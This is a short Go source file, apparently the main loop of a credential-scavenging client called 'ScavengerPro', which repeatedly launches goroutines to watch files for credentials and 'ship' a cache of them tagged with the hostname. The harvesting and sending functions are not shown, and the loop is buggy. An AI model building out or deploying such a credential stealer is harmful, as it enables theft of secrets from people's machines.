package main

import "ScavengerPro/client/cred_cache"
import "fmt"
import "time"
import "os"

func watch(files []string, c cred_cache.CredCache) {
	fmt.Println("watching")
	checkFiles(files, c)
}

func ship(c cred_cache.CredCache, min int) {
	fmt.Println("shipping")
	shipIt(c, min)

}

func main() {
	files := []string{"filepath:type", "file2:type"}
	min := 5
	h, _ := os.Hostname()

	c := cred_cache.CredCache{
		Hostname:    h,
		Credentials: []string{},
	}
	for {
		time.Sleep(2)
		go watch(files, c) // "thread" to watch
		go ship(c, min)    // "thread" to ship
	}
}
